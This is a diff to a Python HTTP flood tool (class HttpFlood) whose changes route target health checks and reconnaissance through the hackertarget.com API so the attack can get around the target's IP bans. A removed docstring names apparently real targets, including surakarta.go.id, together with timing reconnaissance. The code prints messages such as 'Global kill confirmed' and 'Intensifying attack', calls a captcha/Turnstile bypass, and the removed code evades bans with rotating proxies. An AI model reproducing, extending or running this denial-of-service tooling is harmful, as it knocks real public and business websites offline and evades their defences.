@@ -1830,96 +1830,93 @@ class HttpFlood(Thread):
             intel["infra_map"]["xmlrpc_status"] = "UNKNOWN"
 
     def _chaos_response_timing_profiler(self):
-        """[V33] Response Timing Profiler.
-        Deep recon revealed critical timing differences:
-        - konisolo.com: 240ms avg (fast LiteSpeed, small Laravel)
-        - puskesjaten1: 480ms avg with 616ms variance (slow WP, DB-heavy)
-        - hardosoloplast: 3492ms avg with 1034ms variance (VERY HEAVY, 273KB page!)
-        - surakarta.go.id: 247ms avg, 40ms variance (fast but rate-limited)
-        Use timing to detect when target is weakening vs recovering."""
+        """[V42] External IP Health Monitor.
+        Uses hackertarget.com API to check target health from EXTERNAL servers.
+        This completely bypasses any IP ban the target firewall has placed on our network.
+        The ping originates from hackertarget's infrastructure, not our local IP."""
         intel = self._chaos_intel
         if intel["total_executions"] % 25 != 0:
             return
+        
+        # Rate limit external API calls to once every 45 seconds to respect API limits
+        last_ext_check = intel.get("_last_ext_check_time", 0)
+        if time() - last_ext_check < 45:
+            return
+        intel["_last_ext_check_time"] = time()
             
         try:
             import urllib.request
             start = time()
             
-            # [V42] External IP Checking Mode
-            # Bypasses local IP Bans by pinging through random proxies from our verified pool
-            resp = None
-            if hasattr(self, '_proxies') and self._proxies:
-                import random
-                for _ in range(5):
-                    try:
-                        p = random.choice(self._proxies)
-                        proxy_str = f"http://{str(p)}"
-                        proxy_support = urllib.request.ProxyHandler({'http': proxy_str, 'https': proxy_str})
-                        opener = urllib.request.build_opener(proxy_support)
-                        req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/", headers={'User-Agent': 'Mozilla/5.0'})
-                        resp = opener.open(req, timeout=5)
-                        break # Success!
-                    except:
-                        continue
-                        
-            if not resp:
-                # Fallback to direct if all proxies failed or pool empty
-                req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/", headers={'User-Agent': 'Mozilla/5.0'})
-                resp = urllib.request.urlopen(req, timeout=5)
+            # [V42] TRUE External IP Health Check via hackertarget.com
+            # Their server pings the target from THEIR IP (not ours!)
+            target_url = f"{self._target.scheme}://{self._target.authority}/"
+            api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
+            req = urllib.request.Request(api_url, headers={'User-Agent': 'Van-Helsing-Monitor/2.0'})
+            with urllib.request.urlopen(req, timeout=12) as resp:
+                data = resp.read().decode('utf-8', errors='ignore')
+            elapsed_ms = (time() - start) * 1000
+            
+            if 'HTTP/' in data:
+                # hackertarget got a response from the target = target IS ALIVE externally
+                first_line = data.strip().split('\n')[0]  # e.g. "HTTP/1.1 200 OK"
+                try:
+                    status_code = int(first_line.split(' ')[1])
+                except:
+                    status_code = 0
                 
-            with resp:
-                resp.read(512)
-                elapsed_ms = (time() - start) * 1000
-                
-                intel["health_history"].append(elapsed_ms)
+                # Estimate actual target latency (subtract API overhead ~500ms)
+                est_latency = max(elapsed_ms - 500, 50)
+                intel["health_history"].append(est_latency)
                 if len(intel["health_history"]) > 30:
                     intel["health_history"] = intel["health_history"][-30:]
-                    
-                # Compare to baseline
-                baseline = intel.get("response_time_ms", elapsed_ms)
-                if baseline > 0:
-                    ratio = elapsed_ms / baseline
-                    if ratio > 3.0:
+                
+                if status_code >= 500:
+                    # 5xx = target is struggling
+                    intel["target_getting_weaker"] = True
+                    intel["target_is_down"] = False
+                    intel["consecutive_5xx"] = intel.get("consecutive_5xx", 0) + 1
+                    if int(REQUESTS_SENT) < 5000:
+                        print(f"{bcolors.OKGREEN}[EXT PROBE] Target returning {status_code} from EXTERNAL IP! Attack is working!{bcolors.RESET}")
+                elif status_code in (403, 429):
+                    # WAF is active but site is alive
+                    intel["target_getting_weaker"] = False
+                    intel["target_is_down"] = False
+                    if int(REQUESTS_SENT) < 2000:
+                        print(f"{bcolors.WARNING}[EXT PROBE] Target alive (HTTP {status_code}) — WAF active but server healthy.{bcolors.RESET}")
+                else:
+                    # 200/301/302 = target is healthy
+                    baseline = intel.get("response_time_ms", est_latency)
+                    if baseline > 0 and est_latency / baseline > 3.0:
                         intel["target_getting_weaker"] = True
-                        if ratio > 8.0:
-                            intel["target_is_down"] = True
-                    elif ratio < 1.5:
-                        intel["target_getting_weaker"] = False
-                        if intel.get("target_is_down") and ratio < 2.0:
-                            intel["target_is_down"] = False
-                            intel["recovery_detected"] = True
-                            intel["recovery_counter"] += 1
-                            if int(REQUESTS_SENT) < 20000:
-                                print(f"{bcolors.FAIL}[CHAOS HEALTH] Target RECOVERING! Counter-strike initiated (Recovery #{intel['recovery_counter']}).{bcolors.RESET}")
-        except urllib.error.HTTPError as e:
-            if e.code in (403, 503):
-                body = e.read().decode('utf-8', errors='ignore').lower()
-                if "cloudflare" in body or "just a moment" in body or "ddos-guard" in body:
-                    if int(REQUESTS_SENT) < 1000:
-                        print(f"{bcolors.WARNING}[CHAOS UAM] Target is protected by Captcha/UAM (HTTP {e.code}). Attempting bypass...{bcolors.RESET}")
-                    # Trigger the headless Turnstile Dispenser here
-                    token = self._chaos_poll_js_engine_subproc()
-                    if token:
-                        intel["target_getting_weaker"] = False
                     else:
-                        intel["target_getting_weaker"] = True
-            else:
-                intel["target_getting_weaker"] = True
-        except:
-            # Timeout = target might be down
-            # [V40] Prevent False-Positives caused by Self-DDoS (Local Wi-Fi NAT Exhaustion)
-            try:
-                urllib.request.urlopen("https://www.google.com", timeout=3)
-                # Google responded, meaning our internet is fine, thus the target IS actually DOWN.
-                intel["target_getting_weaker"] = True
-                intel["target_is_down"] = True
+                        intel["target_getting_weaker"] = False
+                    intel["target_is_down"] = False
+                    
+                    if intel.get("recovery_detected"):
+                        intel["recovery_counter"] = intel.get("recovery_counter", 0) + 1
+                        if int(REQUESTS_SENT) < 20000:
+                            print(f"{bcolors.FAIL}[EXT PROBE] Target RECOVERED (HTTP {status_code})! Intensifying attack...{bcolors.RESET}")
+                        intel["recovery_detected"] = False
+                
                 intel["local_network_choked"] = False
-            except:
-                # Google also timed out! Our local network is completely congested/exhausted!
-                intel["local_network_choked"] = True
-                intel["target_is_down"] = False
-                if int(REQUESTS_SENT) % 1000 == 0:
-                    print(f"{bcolors.FAIL}[WARNING] Local Wi-Fi Limit Reached (NAT Exhausted). Throttle down Threads!{bcolors.RESET}")
+                intel["ext_health_status"] = f"HTTP {status_code}"
+                
+            elif 'error' in data.lower() or 'timed out' in data.lower() or 'no answer' in data.lower():
+                # hackertarget couldn't reach target either = target is TRULY DOWN globally
+                intel["target_is_down"] = True
+                intel["target_getting_weaker"] = True
+                intel["local_network_choked"] = False
+                intel["ext_health_status"] = "DOWN"
+                intel["health_history"].append(9999)
+                if int(REQUESTS_SENT) < 10000:
+                    print(f"{bcolors.OKGREEN}[EXT PROBE] Target CONFIRMED DOWN from External IP! Global kill confirmed.{bcolors.RESET}")
+            else:
+                intel["ext_health_status"] = "UNKNOWN"
+                
+        except Exception:
+            # hackertarget API itself unreachable (our internet problem, not target)
+            intel["ext_health_status"] = "API_FAIL"
 
     def _chaos_wp_json_exploitation(self):
         """[V32+] WordPress REST API Endpoint Discovery and Exploitation.
@@ -5869,31 +5866,42 @@ class HttpFlood(Thread):
         return False
 
     def _chaos_health_pulse(self):
-        """Periodic health check: re-probe target to detect weakening or death."""
+        """[V42] Periodic health check using EXTERNAL IP via hackertarget API.
+        Completely bypasses local IP bans placed by target firewall."""
         intel = self._chaos_intel
         now = time()
         
-        # Only check every 30 seconds
-        if now - intel.get("last_health_check", 0) < 30:
+        # Only check every 45 seconds (rate-limit for external API)
+        if now - intel.get("last_health_check", 0) < 45:
             return
         intel["last_health_check"] = now
         
         try:
             import urllib.request
             target_url = f"{self._target.scheme}://{self._target.authority}/"
+            api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
             t_start = time()
-            req = urllib.request.Request(target_url, headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
+            req = urllib.request.Request(api_url, headers={
+                'User-Agent': 'Van-Helsing-Pulse/2.0'
             })
-            with urllib.request.urlopen(req, timeout=8) as resp:
-                latency = int((time() - t_start) * 1000)
-                status = resp.status
+            with urllib.request.urlopen(req, timeout=12) as resp:
+                data = resp.read().decode('utf-8', errors='ignore')
+            latency = int((time() - t_start) * 1000)
+            
+            if 'HTTP/' in data:
+                first_line = data.strip().split('\n')[0]
+                try:
+                    status = int(first_line.split(' ')[1])
+                except:
+                    status = 0
                 
-                intel["health_history"].append(latency)
+                # Estimate actual target latency
+                est_latency = max(latency - 500, 50)
+                intel["health_history"].append(est_latency)
                 if len(intel["health_history"]) > 20:
                     intel["health_history"] = intel["health_history"][-20:]
                 
-                # Analyze trend: is target getting weaker?
+                # Analyze trend
                 if len(intel["health_history"]) >= 3:
                     recent_avg = sum(intel["health_history"][-3:]) / 3
                     baseline = intel.get("response_time_ms", 500) or 500
@@ -5909,24 +5917,19 @@ class HttpFlood(Thread):
                         intel["target_is_down"] = False
                         
                 if status >= 500:
-                    intel["consecutive_5xx"] += 1
+                    intel["consecutive_5xx"] = intel.get("consecutive_5xx", 0) + 1
                     
-        except Exception:
-            # Target didn't respond = it's down or blocking us
-            intel["health_history"].append(9999)
-            if len(intel["health_history"]) >= 3:
-                last_3 = intel["health_history"][-3:]
-                if all(t >= 9999 for t in last_3):
-                    try:
-                        import urllib.request
-                        urllib.request.urlopen("https://www.google.com", timeout=3)
+            elif 'error' in data.lower() or 'timed out' in data.lower():
+                # External API also can't reach = truly down
+                intel["health_history"].append(9999)
+                if len(intel["health_history"]) >= 3:
+                    last_3 = intel["health_history"][-3:]
+                    if all(t >= 9999 for t in last_3):
                         intel["target_is_down"] = True
                         intel["target_getting_weaker"] = True
-                        intel["local_network_choked"] = False
-                    except:
-                        intel["target_is_down"] = False
-                        intel["local_network_choked"] = True
-    
+                    
+        except Exception:
+            pass
     def _chaos_detect_waf_adaptation(self):
         """Detect if the WAF is learning our attack patterns and adapting."""
         intel = self._chaos_intel
@@ -5985,22 +5988,37 @@ class HttpFlood(Thread):
         intel["recon_done"] = True
         target_url = f"{self._target.scheme}://{self._target.authority}/"
         
-        # --- PROBE 1: Main page fingerprint ---
+        # --- PROBE 1: Main page fingerprint (via External API to bypass IP bans) ---
         try:
             import urllib.request
             t_start = time()
-            req = urllib.request.Request(target_url, headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate',
+            
+            # [V42] Use hackertarget API for RECON to bypass local IP bans
+            api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
+            req = urllib.request.Request(api_url, headers={
+                'User-Agent': 'Van-Helsing-Recon/2.0'
             })
-            with urllib.request.urlopen(req, timeout=10) as resp:
-                intel["response_time_ms"] = int((time() - t_start) * 1000)
-                headers_raw = str(resp.headers).lower()
-                body = resp.read(16384).decode('utf-8', errors='ignore').lower()
-                server_hdr = resp.headers.get('Server', '').lower()
-                powered_by = resp.headers.get('X-Powered-By', '').lower()
+            with urllib.request.urlopen(req, timeout=15) as resp:
+                intel["response_time_ms"] = max(int((time() - t_start) * 1000) - 500, 50)
+                raw_data = resp.read().decode('utf-8', errors='ignore')
+                headers_raw = raw_data.lower()
+                
+                # hackertarget returns HTTP headers as text, extract server info from those
+                body = ''  # We don't get the body from hackertarget, only headers
+                server_hdr = ''
+                powered_by = ''
+                for hdr_line in raw_data.split('\n'):
+                    if hdr_line.lower().startswith('server:'):
+                        server_hdr = hdr_line.split(':', 1)[1].strip().lower()
+                    elif hdr_line.lower().startswith('x-powered-by:'):
+                        powered_by = hdr_line.split(':', 1)[1].strip().lower()
+                    elif hdr_line.lower().startswith('set-cookie:'):
+                        # Detect Laravel/WordPress from cookies
+                        cookie_val = hdr_line.lower()
+                        if 'xsrf-token' in cookie_val or 'laravel_session' in cookie_val:
+                            body += ' laravel xsrf-token '
+                        if 'wordpress' in cookie_val or 'wp-' in cookie_val:
+                            body += ' wp-content wordpress '
                 
                 # --- Detect Server Type ---
                 if 'nginx' in server_hdr: intel["server_type"] = "nginx"
@@ -7256,15 +7274,14 @@ class HttpFlood(Thread):
             if intel["total_executions"] % 200 == 0 and intel["total_executions"] > 0:
                 elapsed = int(time() - intel["attack_start_time"])
                 
-                # Target health indicator
-                if intel.get("local_network_choked"):
-                    health_indicator = f"{bcolors.FAIL}LOCAL WIFI/NAT DEAD - SELF-DDOS (Decrease Threads!){bcolors.RESET}"
-                elif intel.get("target_is_down"):
-                    health_indicator = f"{bcolors.OKGREEN}DOWN - TARGET ELIMINATED{bcolors.RESET}"
+                # Target health indicator (via External IP Probe)
+                ext_status = intel.get("ext_health_status", "PENDING")
+                if intel.get("target_is_down"):
+                    health_indicator = f"{bcolors.OKGREEN}DOWN - TARGET ELIMINATED (ExtProbe: {ext_status}){bcolors.RESET}"
                 elif intel.get("target_getting_weaker"):
-                    health_indicator = f"{bcolors.WARNING}WEAKENING - Keep pressure{bcolors.RESET}"
+                    health_indicator = f"{bcolors.WARNING}WEAKENING (ExtProbe: {ext_status}){bcolors.RESET}"
                 else:
-                    health_indicator = f"{bcolors.FAIL}HOLDING - Increase intensity{bcolors.RESET}"
+                    health_indicator = f"{bcolors.FAIL}HOLDING (ExtProbe: {ext_status}){bcolors.RESET}"
                     
                 # WAF status
                 waf_status = f"{bcolors.FAIL}ADAPTING - Counter-measures active{bcolors.RESET}" if intel.get("waf_adapting") else f"{bcolors.OKGREEN}Stable{bcolors.RESET}"
